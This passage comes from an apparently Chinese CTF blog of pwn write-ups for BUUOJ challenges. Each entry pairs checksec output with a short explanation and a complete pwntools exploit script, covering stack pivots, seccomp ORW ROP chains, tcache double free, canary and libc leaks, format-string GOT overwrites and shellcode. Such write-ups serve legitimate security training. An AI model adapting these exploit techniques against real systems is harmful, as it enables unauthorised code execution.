class="line">payload&#x3D;&#39;a&#39;*0x6c+&#39;a&#39;*0x4+p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h3><h4 id="checksec检查：-35"><a href="#checksec检查：-35" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-38"><a href="#利用：-38" class="headerlink" title="利用："></a>利用：</h4><p>栈迁移，注意bss段距离got地址很近，需要太高地址，否则got会被覆盖，不可以用system，会有错误。</p>
<h4 id="exp如下：-36"><a href="#exp如下：-36" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,&#39;29211&#39;)</span><br><span class="line"></span><br><span class="line">bank&#x3D;0x0601080</span><br><span class="line">leave&#x3D;0x400699</span><br><span class="line">puts_plt&#x3D;0x04004E0</span><br><span class="line">puts_got&#x3D;0x0601018</span><br><span class="line">pop_rdi&#x3D;0x400703</span><br><span class="line">main&#x3D;0x0400626</span><br><span class="line">ret&#x3D;0x4004c9</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;u want&#39;)</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x60+p64(bank)+p64(leave)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(&#39;now!&#39;)</span><br><span class="line">payload2&#x3D;p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_add&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base&#x3D;puts_add-0x06f690</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x60+&#39;bbbbbbbb&#39;+p64(one_gadget)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.send(&#39;a&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="V-amp-N2020-公开赛-warmup"><a href="#V-amp-N2020-公开赛-warmup" class="headerlink" title="[V&amp;N2020 公开赛]warmup"></a>[V&amp;N2020 公开赛]warmup</h3><h4 id="checksec检查：-36"><a href="#checksec检查：-36" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="seccomp检查：-1"><a href="#seccomp检查：-1" class="headerlink" title="seccomp检查："></a>seccomp检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A !&#x3D; write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A &#x3D; count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A !&#x3D; 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A &#x3D; count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A &#x3D;&#x3D; 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<h4 id="利用：-39"><a href="#利用：-39" class="headerlink" title="利用："></a>利用：</h4><p>开启了seccomp保护，只能利用orw了，发现第一次输入的内容，在第二次输入内容的下方，距离第二个ret结束就是第一次的栈。</p>
<h4 id="exp如下：-37"><a href="#exp如下：-37" class="headerlink" title="exp如下："></a>exp如下：</h4><p>这里的ROP是通过<code>ROPgadget --binary libc --only ‘pop|ret’ | grep ‘rdi’ 和 readelf -S libc | grep “.bss”</code>查找的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29489)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;0x&quot;)   </span><br><span class="line">puts_addr&#x3D;int(p.recv(12),16)</span><br><span class="line">libc&#x3D;ELF(&quot;.&#x2F;libc-2.23.so&quot;)</span><br><span class="line">libcbase_addr&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">#mov_rdi_rsi_ret&#x3D;libcbase_addr+libc.search(asm(&quot;mov rdi,r13\nret&quot;)).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;libcbase_addr+0x21102</span><br><span class="line">pop_rsi_ret&#x3D;libcbase_addr+0x202e8</span><br><span class="line">pop_rdx_ret&#x3D;libcbase_addr+0x1b92</span><br><span class="line">open_addr&#x3D;libcbase_addr+libc.symbols[&#39;open&#39;]</span><br><span class="line">free_hook&#x3D;libcbase_addr+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">read_addr&#x3D;libcbase_addr+libc.symbols[&#39;read&#39;]</span><br><span class="line">puts_addr&#x3D;libcbase_addr+libc.symbols[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload&#x3D;p64(0)+p64(pop_rsi_ret)+p64(free_hook)+p64(pop_rdx_ret)+p64(4)+p64(read_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(free_hook)+p64(pop_rsi_ret)+p64(4)+p64(open_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(free_hook)+p64(pop_rdx_ret)+p64(0x30)+p64(read_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(free_hook)+p64(puts_addr)</span><br><span class="line">p.sendafter(&quot;Input something: &quot;,payload)</span><br><span class="line">p.sendafter(&quot;What&#39;s your name?&quot;,&#39;a&#39;* 0x78+p64(pop_rdi_ret))</span><br><span class="line">p.send(&quot;flag&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h3><h4 id="checksec检查：-37"><a href="#checksec检查：-37" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-40"><a href="#利用：-40" class="headerlink" title="利用："></a>利用：</h4><p>偏移和IDA中的看的不一样，IDA不能全信啊</p>
<h4 id="exp如下：-38"><a href="#exp如下：-38" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bbys_tu_2016&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25461)</span><br><span class="line">flag_addr&#x3D;0x0804856D</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*24+p32(flag_addr)</span><br><span class="line">#sh.recvuntil(&#39;This program is hungry. You should feed it.\n&#39;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h3><h4 id="checksec检查：-38"><a href="#checksec检查：-38" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-41"><a href="#利用：-41" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说的</p>
<h4 id="exp如下：-39"><a href="#exp如下：-39" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;wustctf2020_getshell&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26036)</span><br><span class="line">flag_addr&#x3D;0x0804851B</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+&#39;a&#39;*4+p32(flag_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h3><h4 id="checksec检查：-39"><a href="#checksec检查：-39" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-42"><a href="#利用：-42" class="headerlink" title="利用："></a>利用：</h4><p>double free漏洞，修改一个chunk的size大于0x421，这样free的chunk就进入了unsortedbin,，此时我们再修改回小于tache最大值的大小，这样我们再将其串回tache中，可以地址分配到main_arena中，就可以泄露libc地址。之后就是将free_hook写system。</p>
<h4 id="exp如下：-40"><a href="#exp如下：-40" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ciscn_final_3&#39;)</span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27802)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">def add(index, size, content):</span><br><span class="line">    sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&#39;input the index\n&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&#39;input the size\n&#39;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&#39;now you can write something\n&#39;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;input the index\n&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x10,&#39;a&#39;*8)</span><br><span class="line">sh.recvuntil(&quot;gift :0x&quot;)</span><br><span class="line">heap_addr&#x3D;int(sh.recv(12),16)</span><br><span class="line">print &quot;chunk_addr : &quot;+hex(heap_addr)</span><br><span class="line">heap_base&#x3D;heap_addr-0x011e70</span><br><span class="line">sh.success(&#39;heap_base : &#39; +hex(heap_base))</span><br><span class="line">add(1,0x10,&#39;a&#39;*8)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line">add(2,0x10,p64(heap_addr-0x8))</span><br><span class="line">add(3,0x10,p64(heap_addr-0x8))</span><br><span class="line">add(4,0x10,p64(0x421))</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(5+i,0x70,&#39;a&#39;)</span><br><span class="line">add(12,0x50,&#39;b&#39;)</span><br><span class="line">add(13,0x70,&#39;c&#39;)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(5)</span><br><span class="line">free(5)</span><br><span class="line">add(14,0x70,p64(heap_addr-0x8))</span><br><span class="line">add(15,0x70,p64(heap_addr-0x8))</span><br><span class="line">add(16,0x70,&#39;\x41\x00&#39;)#edit chunk_size</span><br><span class="line"></span><br><span class="line">add(17,0x40,&#39;1111&#39;)#leak libc</span><br><span class="line">free(17)</span><br><span class="line">free(17)</span><br><span class="line">add(18,0x40,p64(heap_addr))</span><br><span class="line">add(19,0x40,p64(heap_addr))</span><br><span class="line">add(20,0x40,&#39;\x00&#39;)</span><br><span class="line">add(21,0x40,&#39;\x00&#39;)</span><br><span class="line">sh.recvuntil(&quot;gift :0x&quot;)</span><br><span class="line">main_arena&#x3D;int(sh.recv(12),16)-144</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;main_arena-0x3ebc40</span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">free(12)</span><br><span class="line">free(12)</span><br><span class="line">add(22,0x50,p64(free_hook))</span><br><span class="line">add(23,0x50,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">add(24,0x50,p64(system_addr))</span><br><span class="line">free(23)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="others-babystack"><a href="#others-babystack" class="headerlink" title="others_babystack"></a>others_babystack</h3><h4 id="checksec检查：-40"><a href="#checksec检查：-40" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-43"><a href="#利用：-43" class="headerlink" title="利用："></a>利用：</h4><p>泄露canary，然后再泄露libc，然后getshell。</p>
<h4 id="exp如下：-41"><a href="#exp如下：-41" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;babystack&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26825)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babystack&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400a93</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">main_addr&#x3D;0x0000000000400908</span><br><span class="line">def read(content):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sleep(1)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">def quit():</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x87+&#39;b&#39;+&#39;a&#39;</span><br><span class="line">read(payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#39;b&#39;)</span><br><span class="line">canary&#x3D;u64(sh.recv(8))-0x61</span><br><span class="line">sh.success(&#39;canary : &#39; +hex(canary))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(canary)+&#39;a&#39;*0x8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">read(payload)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base&#x3D;puts_addr-libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_addr&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">read(payload)</span><br><span class="line">quit()</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h3><h4 id="checksec检查：-41"><a href="#checksec检查：-41" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-44"><a href="#利用：-44" class="headerlink" title="利用："></a>利用：</h4><p>格式化字符串，首先泄露libc，然后通过一次写入2个字节的方式再strlen_got中写入system</p>
<h4 id="exp如下：-42"><a href="#exp如下：-42" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;axb_2019_fmt32&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27810)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;axb_2019_fmt32&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line">strlen_got&#x3D;elf.got[&#39;strlen&#39;]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Please tell me:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;+p32(printf_got)+&#39;b&#39;+&#39;%8$s&#39;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;b&#39;)</span><br><span class="line">printf_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;printf_addr : &#39; +hex(printf_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;printf&#39;,printf_addr)</span><br><span class="line">libc_base&#x3D;printf_addr-libc.dump(&#39;printf&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line"></span><br><span class="line">high_sys&#x3D;(system_addr &gt;&gt;16) &amp; 0xffff</span><br><span class="line">low_sys&#x3D;(system_addr) &amp; 0xffff</span><br><span class="line">sh.success(&#39;high : &#39; +hex(high_sys))</span><br><span class="line">sh.success(&#39;low : &#39; +hex(low_sys))</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;+p32(strlen_got)+p32(strlen_got+2)+&#39;%&#39;+str(low_sys-18)+&#39;c%8$hn&#39;+&#39;%&#39;+str(high_sys-low_sys)+&#39;c%9$hn&#39;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Please tell me:&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#sh.recvcuntil(&#39;Please tell me:&#39;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">payload&#x3D;&#39;;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h3><h4 id="checksec检查-2"><a href="#checksec检查-2" class="headerlink" title="checksec检查:"></a>checksec检查:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-45"><a href="#利用：-45" class="headerlink" title="利用："></a>利用：</h4><p>静态编译的题，<code>ROPgadget --binary rop --ropchain</code>生成ROP链。</p>
<h4 id="exp如下：-43"><a href="#exp如下：-43" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27180)</span><br><span class="line"></span><br><span class="line">p  &#x3D;&#39;a&#39;*0xc+&#39;a&#39;*4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;bin&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h3><h4 id="checksec检查：-42"><a href="#checksec检查：-42" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-46"><a href="#利用：-46" class="headerlink" title="利用："></a>利用：</h4><p>shellcode利用</p>
<h4 id="exp如下：-44"><a href="#exp如下：-44" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25938)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;start&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*20+p32(0x08048087)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">stack_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">shellcode&#x3D;shellcode&#x3D;&#39;&#39;&#39;</span><br><span class="line">xor    eax,eax</span><br><span class="line">push   eax</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">xor    ecx,ecx</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    al,0xb</span><br><span class="line">int    0x80</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">shellcode&#x3D;asm(shellcode)</span><br><span class="line">print disasm(shellcode)</span><br><span 